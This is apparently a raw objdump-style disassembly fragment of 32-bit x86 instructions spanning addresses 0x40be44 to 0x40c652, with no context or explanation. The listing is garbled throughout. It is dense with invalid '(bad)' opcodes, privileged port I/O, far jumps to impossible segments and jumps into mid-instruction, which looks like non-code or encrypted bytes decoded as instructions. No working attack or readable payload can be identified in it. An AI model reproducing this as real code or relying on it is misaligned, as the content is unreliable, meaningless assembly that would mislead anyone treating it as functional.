  40be44:	out    dx,eax
  40be45:	mov    esp,0x2e2f7e2
  40be4a:	aam    0xc0
  40be4c:	std    
  40be4d:	add    al,0xf7
  40be4f:	push   es
  40be50:	pop    es
  40be51:	mov    edx,0xe1e80ae4
  40be57:	in     al,0xe1
  40be59:	ret    
  40be5a:	mov    cl,0xcf
  40be5c:	icebp  
  40be5d:	retf   
  40be5e:	shr    dl,1
  40be60:	fcos   
  40be62:	retf   
  40be63:	mov    eax,0xc0c3f4fe
  40be68:	fst    st(7)
  40be6a:	stc    
  40be6b:	add    bh,ah
  40be6d:	mov    edi,0xc8d6c7db
  40be72:	loop   0x40be72
  40be74:	in     al,0xed
  40be76:	ret    
  40be77:	lods   al,BYTE PTR ds:[esi]
  40be78:	in     al,dx
  40be79:	in     eax,dx
  40be7a:	out    0xfa,eax
  40be7c:	lds    edi,FWORD PTR [ecx-0x16473b1a]
  40be82:	fsub   st(4),st
  40be84:	cli    
  40be85:	enter  0xfbbc,0xf6
  40be89:	lock sar eax,1
  40be8c:	cld    
  40be8d:	jmp    0x40be69
  40be8f:	pop    es
  40be90:	shr    ah,0x1
  40be93:	add    eax,0xcbdeaf01
  40be98:	rcl    cl,cl
  40be9a:	retf   
  40be9b:	lock out dx,al
  40be9d:	int    0xf4
  40be9f:	(bad)  
  40bea0:	mov    edx,0xf8d2ccf0
  40bea5:	rcr    ecx,cl
  40bea7:	add    ch,cl
  40bea9:	(bad)  
  40beaa:	(bad)  
  40beab:	out    0xbc,eax
  40bead:	clc    
  40beae:	or     bh,dl
  40beb0:	push   cs
  40beb1:	cmc    
  40beb2:	lldt   bx
  40beb5:	test   al,0xe5
  40beb7:	jecxz  0x40bea1
  40beb9:	aad    0xad
  40bebb:	out    0xf2,eax
  40bebd:	into   
  40bebe:	jmp    0x40be7a
  40bec0:	fcmove st,st(4)
  40bec2:	fistp  QWORD PTR [ebx-0x646250b]
  40bec8:	mul    esp
  40beca:	loopne 0x40be9e
  40becc:	in     al,0xf9
  40bece:	add    ebx,edi
  40bed0:	stc    
  40bed1:	add    bl,bl
  40bed3:	lds    eax,FWORD PTR [eax]
  40bed5:	repnz loope 0x40be88
  40bed8:	shl    al,0xb5
  40bedb:	int    0xbb
  40bedd:	(bad)  
  40bede:	jmp    0xee05b8d3
  40bee3:	jmp    0xf6ff93ab
  40bee8:	fnstcw WORD PTR [ebp-0x3ef90e24]
  40beee:	jmp    edi
  40bef0:	frndint 
  40bef2:	(bad)  
  40bef4:	pop    es
  40bef5:	mov    esi,0xf5e1afea
  40befa:	mov    ch,0xb2
  40befc:	rcl    al,cl
  40befe:	enter  0xe5d5,0xe9
  40bf02:	out    dx,eax
  40bf03:	in     eax,dx
  40bf04:	icebp  
  40bf05:	jecxz  0x40befa
  40bf07:	out    dx,al
  40bf08:	shl    ch,0xc4
  40bf0b:	pop    es
  40bf0c:	ret    0xe1ca
  40bf0f:	pop    es
  40bf10:	fimul  DWORD PTR [esi+ecx*8]
  40bf13:	add    al,0xe9
  40bf15:	in     al,0xe5
  40bf17:	icebp  
  40bf18:	loopne 0x40bee4
  40bf1a:	mov    ah,0xc4
  40bf1c:	ret    0xe7b5
  40bf1f:	clc    
  40bf20:	retf   0xd0d9
  40bf23:	repnz repnz mov eax,0xd5d7f4ec
  40bf2a:	mov    esi,0x8dedcda
  40bf2f:	or     cl,BYTE PTR [edi]
  40bf31:	loope  0x40bf27
  40bf33:	into   
  40bf34:	in     eax,0xe3
  40bf36:	repz shr BYTE PTR [edi-0x3e173b29],1
  40bf3d:	call   0xcb13ac18
  40bf42:	in     al,0xf1
  40bf44:	in     eax,dx
  40bf45:	loope  0x40bf2a
  40bf47:	into   
  40bf48:	fnclex 
  40bf4a:	mov    ebp,0xc2e100c4
  40bf4f:	out    0xed,eax
  40bf51:	out    0x13,eax
  40bf53:	out    0xcd,al
  40bf55:	fnsave [edx-0x39234217]
  40bf5b:	(bad)
  40bf5e:	retf   0xe4ba
  40bf61:	call   0x1349d3d
  40bf66:	add    dh,dl
  40bf68:	out    0xc2,al
  40bf6a:	add    edx,esp
  40bf6c:	clc    
  40bf6d:	xlat   BYTE PTR ds:[ebx]
  40bf6e:	add    al,0xc9
  40bf70:	or     eax,0xc4130cff
  40bf75:	scas   eax,DWORD PTR es:[edi]
  40bf76:	out    0xc0,eax
  40bf78:	int3   
  40bf79:	out    0xaa,al
  40bf7b:	mov    al,0xb6
  40bf7d:	(bad)  
  40bf7e:	jmp    0xf3eb:0xbebdd3d5
  40bf85:	lock cmc 
  40bf87:	fdiv   st(3),st
  40bf89:	jecxz  0x40bf91
  40bf8b:	add    esi,esp
  40bf8d:	leave  
  40bf8e:	shl    ebp,0xd8
  40bf91:	cld    
  40bf92:	loop   0x40bf70
  40bf94:	push   es
  40bf95:	mov    edi,0xeed3c3cd
  40bf9a:	xlat   BYTE PTR ds:[ebx]
  40bf9b:	aam    0xca
  40bf9d:	out    0xcf,eax
  40bf9f:	iret   
  40bfa0:	out    0xbb,al
  40bfa2:	enter  0xdaf5,0xee
  40bfa6:	jecxz  0x40bf65
  40bfa8:	add    bh,dh
  40bfaa:	in     al,0xea
  40bfac:	add    cl,BYTE PTR [edx]
  40bfae:	loop   0x40bf79
  40bfb0:	fucom  st(4)
  40bfb2:	pop    es
  40bfb3:	fcom   DWORD PTR [ebx]
  40bfb5:	(bad)  
  40bfb6:	in     al,0xd2
  40bfb8:	test   al,0xe7
  40bfba:	ret    0xf4e7
  40bfbd:	aam    0xcd
  40bfbf:	in     eax,0xf9
  40bfc1:	fcom   st(1)
  40bfc3:	retf   
  40bfc4:	mov    eax,0xbcb901d5
  40bfc9:	(bad)  
  40bfca:	add    DWORD PTR [ebx],ecx
  40bfcc:	mov    DWORD PTR [eax],0xfcf4e2f8
  40bfd2:	enter  0xeb0d,0xb9
  40bfd6:	in     eax,dx
  40bfd7:	ffree  st(0)
  40bfd9:	call   0xf30c93b5
  40bfde:	mov    dl,0xb8
  40bfe0:	fcomp  st(1)
  40bfe2:	xlat   BYTE PTR ds:[ebx]
  40bfe3:	ret    
  40bfe4:	jmp    0x3be:0xdbdce7db
  40bfeb:	or     edx,esp
  40bfed:	(bad)  
  40bfee:	add    eax,0x50f0be4
  40bff3:	int    0xf9
  40bff5:	fsubrp st(3),st
  40bff7:	iret   
  40bff8:	jmp    0xc1eea0a9
  40bffd:	aad    0xeb
  40bfff:	div    DWORD PTR [ebp-0x46032229]
  40c005:	mov    eax,0xd706feb6
  40c00a:	rol    BYTE PTR [edx],1
  40c00c:	mul    esi
  40c00e:	jmp    0x40bff7
  40c010:	lds    ecx,FWORD PTR ds:0xcc05020e
  40c016:	lods   eax,DWORD PTR ds:[esi]
  40c017:	int    0xf1
  40c019:	jecxz  0x40bfd0
  40c01b:	out    0xb7,al
  40c01d:	mov    ah,0xd9
  40c01f:	mov    ecx,0xc9b8b6ef
  40c024:	add    ebx,edi
  40c026:	iret   
  40c027:	sti    
  40c028:	fadd   QWORD PTR ds:0x8eb02d6
  40c02e:	fsubr  st,st(3)
  40c030:	cli    
  40c031:	in     eax,0x0
  40c033:	into   
  40c034:	clc    
  40c035:	leave  
  40c036:	jmp    0xd2ea:0xeacfdea8
  40c03d:	div    bl
  40c03f:	iret   
  40c040:	enter  0xeede,0xd3
  40c044:	retf   0xeec9
  40c047:	add    ah,al
  40c049:	xlat   BYTE PTR ds:[ebx]
  40c04a:	fadd   st(3),st
  40c04c:	mov    esp,0xc5c4d7e5
  40c051:	(bad)  
  40c052:	fld    st(5)
  40c054:	(bad)  
  40c056:	(bad)
  40c059:	shr    cl,cl
  40c05b:	ror    ah,cl
  40c05d:	loope  0x40c016
  40c05f:	jmp    0xfe1d8922
  40c064:	sti    
  40c065:	cmc    
  40c066:	sar    BYTE PTR [ebp-0x422f02f9],0xea
  40c06d:	retf   0xd6f5
  40c070:	or     al,bl
  40c072:	fadd   st(1),st
  40c074:	rcr    ecx,cl
  40c076:	mov    esi,0xcac4d3ed
  40c07b:	mov    cl,0xf2
  40c07d:	jmp    0x40c074
  40c07f:	mov    bh,0xbe
  40c081:	out    dx,eax
  40c082:	repz std 
  40c084:	leave  
  40c085:	mov    ebx,0xd003f5d1
  40c08a:	cli    
  40c08b:	neg    dl
  40c08d:	loop   0x40c04d
  40c08f:	jmp    0x40c066
  40c091:	enter  0xef0b,0xca
  40c095:	rol    bl,1
  40c097:	int    0xcb
  40c099:	in     al,0xcf
  40c09b:	loopne 0x40c08e
  40c09d:	cmc    
  40c09e:	call   0xd729b195
  40c0a3:	fucomip st,st(4)
  40c0a5:	fcomip st,st(3)
  40c0a7:	stc    
  40c0a8:	loope  0x40c0a7
  40c0aa:	ret    0x4e5
  40c0ad:	or     esp,eax
  40c0af:	fimul  WORD PTR [eax]
  40c0b1:	inc    ah
  40c0b3:	push   cs
  40c0b4:	push   es
  40c0b5:	ret    0xc5c8
  40c0b8:	leave  
  40c0b9:	scas   eax,DWORD PTR es:[edi]
  40c0ba:	out    dx,al
  40c0bb:	rol    dh,1
  40c0bd:	jmp    0xf2ec:0xbef4bfb1
  40c0c4:	jmp    0x4ff:0xdbf3b8d0
  40c0cb:	(bad)  
  40c0cc:	div    esi
  40c0ce:	aam    0xef
  40c0d0:	push   es
  40c0d1:	or     edi,edi
  40c0d3:	add    dh,dl
  40c0d5:	call   0xd321b8c6
  40c0da:	enter  0xccbb,0xf6
  40c0de:	out    0xda,al
  40c0e0:	retf   0xcae9
  40c0e3:	aam    0xf5
  40c0e5:	mov    esi,0xdef3c2fc
  40c0ea:	rcl    esp,1
  40c0ec:	loopne 0x40c0c9
  40c0ee:	add    ebp,edi
  40c0f0:	add    al,0xef
  40c0f2:	out    dx,al
  40c0f3:	in     al,dx
  40c0f4:	ror    bh,0xd0
  40c0f7:	iret   
  40c0f8:	mov    ebp,0xb0cff1d2
  40c0fd:	cli    
  40c0fe:	in     eax,dx
  40c0ff:	iret   
  40c100:	mov    ah,0xf5
  40c102:	stc    
  40c103:	hlt    
  40c104:	mov    esi,0xe1bef9bc
  40c109:	(bad)  
  40c10a:	out    0x7,al
  40c10c:	pop    es
  40c10d:	push   es
  40c10e:	loope  0x40c117
  40c110:	add    eax,0xe9e0c4ef
  40c115:	int3   
  40c116:	out    dx,al
  40c117:	fst    st(5)
  40c119:	int    0xe7
  40c11b:	sar    DWORD PTR [ebx-0x22052425],0xd7
  40c122:	ror    bl,1
  40c124:	clc    
  40c125:	mov    ecx,0xf3f3f8e7
  40c12a:	cld    
  40c12b:	ret    0xd0de
  40c12e:	out    0xf8,eax
  40c130:	cmc    
  40c131:	cld    
  40c132:	jmp    0x40c127
  40c134:	in     al,0xce
  40c136:	int    0xbd
  40c138:	iret   
  40c139:	in     al,0xc7
  40c13b:	aam    0xb1
  40c13d:	out    0xf2,eax
  40c13f:	leave  
  40c140:	(bad)  
  40c141:	into   
  40c142:	not    ebx
  40c144:	fcom   st(4)
  40c146:	fsubr  st(7),st
  40c148:	mov    edi,0xc4d4d4de
  40c14d:	(bad)  
  40c14f:	fld    QWORD PTR [ebx]
  40c151:	(bad)  
  40c152:	stc    
  40c153:	into   
  40c154:	loopne 0x40c117
  40c156:	rcl    eax,1
  40c158:	xlat   BYTE PTR ds:[ebx]
  40c159:	rcr    ebx,1
  40c15b:	jecxz  0x40c126
  40c15d:	mov    bh,0xd4
  40c15f:	hlt    
  40c160:	stc    
  40c161:	sar    edi,cl
  40c163:	iret   
  40c164:	icebp  
  40c165:	fdivp  st(0),st
  40c167:	mov    ch,0xd4
  40c169:	fninit 
  40c16b:	add    ah,bl
  40c16d:	jmp    0xcf218a67
  40c172:	(bad)  
  40c173:	jmp    0x40c17d
  40c175:	fld    st(7)
  40c177:	loope  0x40c129
  40c179:	(bad)
  40c17c:	call   0xc62bbc55
  40c181:	fidivr WORD PTR [esp+edi*8-0x1e002805]
  40c188:	(bad)  
  40c18a:	neg    edi
  40c18c:	fisttp QWORD PTR [edx]
  40c18e:	clc    
  40c18f:	imul   esi
  40c191:	loopne 0x40c190
  40c193:	out    0xb,al
  40c195:	ret    0xd3df
  40c198:	mov    dh,0xe1
  40c19a:	(bad)  
  40c19b:	(bad)
  40c19f:	mov    cl,0xb4
  40c1a1:	aam    0xf6
  40c1a3:	mov    esp,0xdef8ecf6
  40c1a8:	loop   0x40c1a7
  40c1aa:	lock ret 
  40c1ac:	ret    0xebdd
  40c1af:	fmulp  st(1),st
  40c1b1:	sti    
  40c1b2:	add    ebx,edx
  40c1b4:	leave  
  40c1b5:	fcomp  st(0)
  40c1b7:	ror    bh,cl
  40c1b9:	jecxz  0x40c1ad
  40c1bb:	into   
  40c1bc:	aad    0xc9
  40c1be:	rcl    dh,1
  40c1c0:	test   bh,0xb2
  40c1c3:	fldlg2 
  40c1c5:	int3   
  40c1c6:	enter  0xe0cc,0xf6
  40c1ca:	add    cl,bh
  40c1cc:	add    al,0xf8
  40c1ce:	or     ebx,edx
  40c1d0:	fdivr  st,st(4)
  40c1d2:	fiadd  DWORD PTR [edi]
  40c1d4:	faddp  st(5),st
  40c1d6:	mov    esi,0xf0d0edc0
  40c1db:	mov    ch,0xcd
  40c1dd:	mov    bh,0xce
  40c1df:	(bad)  
  40c1e0:	mov    ecx,0xf8f8dcd9
  40c1e5:	loope  0x40c1d8
  40c1e7:	out    dx,eax
  40c1e8:	int3   
  40c1e9:	fcmovbe st,st(0)
  40c1eb:	(bad)  
  40c1ec:	jmp    0xddc5:0xbfaffca
  40c1f3:	in     al,0xe0
  40c1f5:	into   
  40c1f6:	out    dx,al
  40c1f7:	rol    ebp,cl
  40c1f9:	mul    esp
  40c1fb:	sti    
  40c1fc:	shl    ebp,1
  40c1fe:	hlt    
  40c1ff:	(bad)  
  40c201:	xlat   BYTE PTR ds:[ebx]
  40c202:	mov    dl,0xb5
  40c204:	mov    ebx,0xd4fabcff
  40c209:	in     eax,0x6
  40c20b:	rcr    edx,0xeb
  40c20e:	cli    
  40c20f:	jmp    0xe605abed
  40c214:	loope  0x40c206
  40c216:	loop   0x40c207
  40c218:	fadd   st(4),st
  40c21a:	ret    0xd1bb
  40c21d:	in     eax,dx
  40c21e:	aad    0xcf
  40c220:	aad    0xe4
  40c222:	into   
  40c223:	mul    ebx
  40c225:	clc    
  40c226:	(bad)  
  40c228:	(bad)  
  40c229:	out    0xd9,eax
  40c22b:	not    ch
  40c22d:	mul    ebp
  40c22f:	fsubr  st(4),st
  40c231:	fsubrp st(6),st
  40c233:	jmp    0x40c204
  40c235:	loope  0x40c21a
  40c237:	faddp  st(7),st
  40c239:	mov    esp,0xe6f6eab2
  40c23e:	aam    0xbf
  40c240:	hlt    
  40c241:	mov    ecx,0xd8f0dafb
  40c246:	repz push es
  40c248:	out    dx,al
  40c249:	fcomip st,st(7)
  40c24b:	fdivp  st(0),st
  40c24d:	ret    0xc8f7
  40c250:	jecxz  0x40c247
  40c252:	out    dx,al
  40c253:	cld    
  40c254:	call   0xf430ba26
  40c259:	iret   
  40c25a:	lods   al,BYTE PTR ds:[esi]
  40c25b:	(bad)  
  40c25d:	aam    0xc5
  40c25f:	retf   0xfccd
  40c262:	shl    bh,cl
  40c264:	lock fnstcw WORD PTR [ebp+0x3fcf9ed]
  40c26b:	retf   
  40c26c:	push   es
  40c26d:	retf   0xc5fe
  40c270:	stc    
  40c271:	(bad)  
  40c272:	in     al,dx
  40c273:	or     eax,0xcbaabe12
  40c278:	out    dx,al
  40c279:	loop   0x40c22c
  40c27b:	(bad)  
  40c27c:	aad    0xcc
  40c27e:	mov    eax,0xd7dfd6b8
  40c283:	mov    esi,0xdbf6f8ea
  40c288:	sar    BYTE PTR [ebx+0x9f1dbd7],1
  40c28e:	add    bl,ah
  40c290:	jmp    0xe6cb:0x4eafbee
  40c297:	retf   0xeca4
  40c29a:	icebp  
  40c29b:	rol    esp,cl
  40c29d:	retf   
  40c29e:	(bad)  
  40c29f:	mov    bh,0xd8
  40c2a1:	lock rcl bl,1
  40c2a4:	jmp    0xe704b880
  40c2a9:	add    BYTE PTR [ebx],cl
  40c2ab:	rol    BYTE PTR ds:0x2ead9f1,0xdd
  40c2b2:	in     eax,0xe8
  40c2b4:	adc    esi,ebx
  40c2b6:	stos   BYTE PTR es:[edi],al
  40c2b7:	mov    dl,0xc6
  40c2b9:	(bad)  
  40c2ba:	out    0xd1,eax
  40c2bc:	sti    
  40c2bd:	shl    DWORD PTR [ecx+edi*8-0x44160a12],0xcd
  40c2c5:	cli    
  40c2c6:	iret   
  40c2c7:	std    
  40c2c8:	clc    
  40c2c9:	(bad)  
  40c2ca:	loop   0x40c2c2
  40c2cc:	repnz sti 
  40c2ce:	sgdtd  [edx]
  40c2d1:	inc    ch
  40c2d3:	out    dx,al
  40c2d4:	call   0xb30f82bd
  40c2d9:	into   
  40c2da:	in     al,dx
  40c2db:	aam    0xc1
  40c2dd:	cmc    
  40c2de:	retf   0xd4d3
  40c2e1:	mov    ebx,0xbcdefcd6
  40c2e6:	std    
  40c2e7:	(bad)  
  40c2e9:	(bad)  
  40c2ea:	or     edi,esi
  40c2ec:	inc    esp
  40c2ee:	dec    edi
  40c2f0:	push   cs
  40c2f1:	movntq (bad),mm3
  40c2f2:	out    0xde,eax
  40c2f4:	shl    ch,0xa6
  40c2f7:	jecxz  0x40c2a6
  40c2f9:	test   edx,0xe6cce4b6
  40c2ff:	cmc    
  40c300:	dec    cl
  40c302:	call   0xfa237fde
  40c307:	div    ch
  40c309:	loop   0x40c2dd
  40c30b:	retf   
  40c30c:	in     al,0x1
  40c30e:	fcmovbe st,st(4)
  40c310:	add    ebp,ebx
  40c312:	out    dx,al
  40c313:	or     bl,bh
  40c315:	icebp  
  40c316:	in     eax,0xe2
  40c318:	ret    
  40c319:	ror    esi,cl
  40c31b:	hlt    
  40c31c:	stc    
  40c31d:	mov    ecx,0xd4e5fada
  40c322:	(bad)  
  40c323:	mov    esp,0xe7c3eec2
  40c328:	add    al,dh
  40c32a:	idiv   bl
  40c32c:	in     eax,0x2
  40c32e:	(bad)  
  40c32f:	cli    
  40c330:	out    0x9,eax
  40c332:	fist   DWORD PTR [edx]
  40c334:	fcom   st(3)
  40c336:	les    esi,FWORD PTR [ecx-0x2e341a34]
  40c33c:	jmp    0xb5b9:0xe6d5d9da
  40c343:	out    dx,al
  40c344:	in     eax,dx
  40c345:	in     eax,dx
  40c346:	lock into 
  40c348:	ret    0xd201
  40c34b:	loope  0x40c32e
  40c34d:	ret    0xbdd9
  40c350:	hlt    
  40c351:	dec    esi
  40c353:	or     ebx,ebp
  40c355:	jmp    0x40c33c
  40c357:	call   0xe1298c24
  40c35c:	retf   0xbbe8
  40c35f:	int3   
  40c360:	mov    eax,0xcfe3d1d2
  40c365:	shl    edx,0xcf
  40c368:	add    bh,bh
  40c36a:	clc    
  40c36b:	clc    
  40c36c:	add    al,0xe1
  40c36e:	jmp    0xf3c9:0xe1e9e9d7
  40c375:	fsubr  st,st(1)
  40c377:	leave  
  40c378:	loop   0x40c35c
  40c37a:	icebp  
  40c37b:	rol    ecx,1
  40c37d:	out    0xf6,al
  40c37f:	(bad)  
  40c380:	call   0xcf13b16d
  40c385:	add    ah,dl
  40c387:	icebp  
  40c388:	rcr    esi,1
  40c38a:	out    0xe0,al
  40c38c:	push   es
  40c38d:	call   esp
  40c38f:	hlt    
  40c390:	fimul  WORD PTR [edx]
  40c392:	stc    
  40c393:	add    ah,bh
  40c395:	stos   BYTE PTR es:[edi],al
  40c396:	mov    al,0xb2
  40c398:	call   0xb822bb52
  40c39d:	rol    al,cl
  40c39f:	(bad)  
  40c3a0:	fucom  st(4)
  40c3a2:	fcom   st(4)
  40c3a4:	fcmovb st,st(2)
  40c3a6:	mov    edx,0xd8f2d2f3
  40c3ab:	(bad)  
  40c3ac:	sti    
  40c3ad:	(bad)  
  40c3af:	call   0x130da3b9
  40c3b4:	fsubr  DWORD PTR [eax-0x36505339]
  40c3ba:	rcr    ebx,0xac
  40c3bd:	(bad)  
  40c3be:	shr    BYTE PTR [ebp-0x26413146],1
  40c3c4:	mov    ebp,0xc3ded6dd
  40c3c9:	(bad)  
  40c3ca:	int3   
  40c3cb:	retf   
  40c3cc:	mov    esp,0xc705e3c6
  40c3d1:	les    ecx,FWORD PTR [ecx]
  40c3d3:	stc    
  40c3d4:	jmp    0xbce6:0xc4c2c5e8
  40c3db:	xlat   BYTE PTR ds:[ebx]
  40c3dc:	leave  
  40c3dd:	(bad)  
  40c3de:	mov    ecx,0xd3bde9cb
  40c3e3:	stc    
  40c3e4:	into   
  40c3e5:	jecxz  0x40c3aa
  40c3e7:	(bad)  
  40c3e8:	cld    
  40c3e9:	fxtract 
  40c3eb:	aam    0xf7
  40c3ed:	jecxz  0x40c3b9
  40c3ef:	jmp    0xcd05a3d3
  40c3f4:	pop    es
  40c3f5:	repnz fadd st(6),st
  40c3f8:	shr    al,cl
  40c3fa:	out    0xe2,eax
  40c3fc:	(bad)  
  40c3fe:	cli    
  40c3ff:	sar    al,cl
  40c401:	std    
  40c402:	retf   
  40c403:	rcr    al,1
  40c405:	lock aad 0xe3
  40c408:	(bad)  
  40c409:	(bad)  
  40c40b:	repnz (bad) 
  40c40e:	(bad)  
  40c40f:	retf   
  40c410:	or     bl,ah
  40c412:	or     edx,DWORD PTR [edx]
  40c414:	(bad)  
  40c415:	fsubrp st(3),st
  40c417:	in     al,dx
  40c418:	(bad)  
  40c419:	(bad)  
  40c41a:	sar    ebx,1
  40c41c:	lock test cl,0xd8
  40c420:	mov    edx,0xddd7cfeb
  40c425:	loope  0x40c41c
  40c427:	lock imul ch
  40c42a:	cli    
  40c42b:	rcl    esp,1
  40c42d:	sar    ebx,1
  40c42f:	(bad)  
  40c430:	call   0xc04aa13b
  40c435:	mov    bl,0xd0
  40c437:	out    dx,al
  40c438:	mov    ebp,0xb0d5e7ca
  40c43d:	mov    ebx,0xc8d3b4cd
  40c442:	out    dx,al
  40c443:	leave  
  40c444:	add    ecx,esi
  40c446:	int3   
  40c447:	sar    dl,1
  40c449:	sar    DWORD PTR [ebx+eax*1-0x37280948],cl
  40c450:	call   0xef40bc60
  40c455:	ret    0xe1ea
  40c458:	mov    bh,0xab
  40c45a:	(bad)  
  40c45b:	mov    ah,0xf2
  40c45d:	repz aam 0xfa
  40c460:	icebp  
  40c461:	mov    dh,0xf8
  40c463:	aad    0xd6
  40c465:	fcomip st,st(6)
  40c467:	lock mov esp,0x7fef0f8
  40c46d:	aam    0xc0
  40c46f:	or     edi,eax
  40c471:	stc    
  40c472:	fsub   st,st(2)
  40c474:	or     ch,ch
  40c476:	jmp    0xefe8:0xe9cbd0a8
  40c47d:	stc    
  40c47e:	rcl    al,cl
  40c480:	in     al,dx
  40c481:	hlt    
  40c482:	iret   
  40c483:	stc    
  40c484:	(bad)  
  40c485:	jecxz  0x40c463
  40c487:	out    0xbd,al
  40c489:	int    0x4
  40c48b:	ror    BYTE PTR [ebx],0xc9
  40c48e:	sti    
  40c48f:	fdivr  st,st(3)
  40c491:	add    eax,0xabcd0ada
  40c496:	in     eax,dx
  40c497:	iret   
  40c498:	vpmulhuw ymm4,ymm1,ymm0
  40c49c:	in     al,0xb7
  40c49e:	aam    0xe5
  40c4a0:	(bad)  
  40c4a1:	sti    
  40c4a2:	(bad)  
  40c4a3:	mov    ebx,0xedd6e1d6
  40c4a8:	ret    0xba05
  40c4ab:	shl    bh,0xc5
  40c4ae:	retf   
  40c4af:	add    cl,bl
  40c4b1:	in     eax,0xf8
  40c4b3:	retf   0xf1d2
  40c4b6:	mov    edi,0xc0bcaec6
  40c4bb:	in     eax,dx
  40c4bc:	rol    cl,cl
  40c4be:	(bad)  
  40c4bf:	repz (bad) 
  40c4c1:	(bad)  [ebp-0x3e1c2205]
  40c4c7:	in     al,dx
  40c4c8:	ret    0xeccd
  40c4cb:	dec    DWORD PTR [ebx]
  40c4cd:	ffreep st(5)
  40c4cf:	stc    
  40c4d0:	clc    
  40c4d1:	(bad)  
  40c4d2:	in     eax,dx
  40c4d3:	loop   0x40c4a4
  40c4d5:	fdivr  QWORD PTR [esi-0x3f130812]
  40c4db:	mov    bh,0xe7
  40c4dd:	(bad)  
  40c4de:	jmp    esi
  40c4e0:	repz into 
  40c4e2:	rcl    esi,1
  40c4e4:	icebp  
  40c4e5:	cmc    
  40c4e6:	test   al,0x6
  40c4e9:	fldpi  
  40c4eb:	in     al,0xdb
  40c4ed:	(bad)  
  40c4ee:	clc    
  40c4ef:	or     cl,bh
  40c4f1:	out    dx,eax
  40c4f2:	iret   
  40c4f3:	int    0xd3
  40c4f5:	in     al,0xf0
  40c4f7:	enter  0xf1c0,0xc0
  40c4fb:	mov    dl,0xf4
  40c4fd:	shr    esp,cl
  40c4ff:	lods   eax,DWORD PTR ds:[esi]
  40c500:	int3   
  40c501:	rcl    bl,1
  40c503:	fcmovne st,st(6)
  40c505:	add    eax,eax
  40c507:	loope  0x40c503
  40c509:	add    al,0xf4
  40c50b:	pop    es
  40c50c:	sti    
  40c50d:	fcmovnbe st,st(7)
  40c50f:	iret   
  40c510:	jecxz  0x40c4ed
  40c512:	into   
  40c513:	loop   0x40c4e3
  40c515:	stos   BYTE PTR es:[edi],al
  40c516:	(bad)  
  40c517:	repz fidiv WORD PTR [edx-0x13374c0d]
  40c51e:	lock lds edi,FWORD PTR [edi-0x36024524]
  40c525:	lock add bh,al
  40c528:	imul   ah
  40c52a:	clc    
  40c52b:	add    bh,cl
  40c52d:	sar    bh,1
  40c52f:	aam    0xef
  40c531:	or     cl,BYTE PTR [esi]
  40c533:	or     DWORD PTR [ecx],ecx
  40c535:	out    dx,al
  40c536:	in     eax,0xe2
  40c538:	lock call 0xcf079839
  40c53e:	mov    dh,0xd5
  40c540:	leave  
  40c541:	mov    esi,0xbeecc3f4
  40c546:	sti    
  40c547:	(bad)  
  40c549:	repnz (bad) 
  40c54c:	rol    edx,0x4
  40c54f:	jmp    0xf3d8:0xdf09c6eb
  40c556:	out    0xe6,eax
  40c558:	cmc    
  40c559:	aam    0xcf
  40c55b:	jmp    0xd30aa020
  40c560:	cli    
  40c561:	lock shl cl,1
  40c564:	mov    edi,0xd3dcf7e3
  40c569:	sar    dh,1
  40c56b:	retf   
  40c56c:	fadd   DWORD PTR ds:0xcac6bdd9
  40c572:	cld    
  40c573:	in     al,0xe5
  40c575:	call   0xd109ae4a
  40c57a:	retf   
  40c57b:	cmc    
  40c57c:	rcl    bl,0xc6
  40c57f:	mov    eax,0xd0fadcd7
  40c584:	mov    al,0xbf
  40c586:	idiv   eax
  40c588:	(bad)  
  40c589:	in     al,0xbe
  40c58b:	or     bl,dl
  40c58d:	fcmovb st,st(1)
  40c58f:	retf   0x30d
  40c592:	or     cl,ch
  40c594:	adc    cl,ah
  40c596:	mov    dl,0xcb
  40c598:	rol    ebp,0xf6
  40c59b:	ret    
  40c59c:	call   0x6af79
  40c5a1:	jmp    0xcecc:0xedd7f1fb
  40c5a8:	mov    edi,0x4fd0be7
  40c5ad:	sar    ah,0xe2
  40c5b0:	(bad)  
  40c5b1:	sti    
  40c5b2:	add    esi,edi
  40c5b4:	in     al,dx
  40c5b5:	(bad)  
  40c5b6:	out    dx,al
  40c5b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5b8:	retf   0xd7dc
  40c5bb:	ret    
  40c5bc:	in     al,0xee
  40c5be:	mov    cl,0xec
  40c5c0:	enter  0xf6bb,0xf0
  40c5c4:	mov    edi,0xf1d2dce0
  40c5c9:	repnz loope 0x40c5d2
  40c5cc:	out    0xc5,eax
  40c5ce:	fcmovnb st,st(1)
  40c5d0:	or     ebx,esp
  40c5d2:	cli    
  40c5d3:	fdivp  st(7),st
  40c5d5:	shr    DWORD PTR [eax-0x4d291820],1
  40c5db:	div    bh
  40c5dd:	mov    ah,0xb8
  40c5df:	cli    
  40c5e0:	repnz mov bl,0xec
  40c5e3:	cli    
  40c5e4:	in     eax,dx
  40c5e5:	in     al,dx
  40c5e6:	int    0xec
  40c5e8:	xlat   BYTE PTR ds:[ebx]
  40c5e9:	(bad)  
  40c5eb:	jmp    0x40c5e9
  40c5ed:	shr    bh,1
  40c5ef:	fimul  WORD PTR [esi]
  40c5f1:	(bad)  
  40c5f2:	cli    
  40c5f3:	repz jecxz 0x40c5cf
  40c5f6:	loope  0x40c5bb
  40c5f8:	scas   al,BYTE PTR es:[edi]
  40c5f9:	xlat   BYTE PTR ds:[ebx]
  40c5fa:	aam    0xdb
  40c5fc:	idiv   eax
  40c5fe:	(bad)  
  40c600:	int    0xeb
  40c602:	enter  0xc2f8,0xdf
  40c606:	in     al,dx
  40c607:	shl    eax,cl
  40c609:	icebp  
  40c60a:	(bad)  
  40c60b:	inc    DWORD PTR [edx]
  40c60d:	call   eax
  40c60f:	fld    DWORD PTR [edx]
  40c611:	(bad)  
  40c612:	adc    eax,ebp
  40c614:	in     al,dx
  40c615:	lods   eax,DWORD PTR ds:[esi]
  40c616:	shl    edi,0xcd
  40c619:	jmp    0xd92f98f5
  40c61e:	(bad)  [edi-0x322b4941]
  40c624:	call   ebx
  40c626:	div    edx
  40c628:	(bad)  
  40c629:	aad    0xc1
  40c62b:	lock pop es
  40c62d:	add    eax,0xf80a01c1
  40c632:	iret   
  40c633:	add    eax,0xb7f0ecfe
  40c638:	mov    edx,0xc5b5f5f6
  40c63e:	mov    al,0xed
  40c640:	not    edi
  40c642:	(bad)  
  40c643:	fmulp  st(7),st
  40c645:	add    ah,dl
  40c647:	jecxz  0x40c61c
  40c649:	out    0xfe,eax
  40c64b:	fdivp  st(0),st
  40c64d:	fld    st(1)
  40c64f:	(bad)  
  40c650:	jmp    0x40c62a
  40c652:	aam    0x7
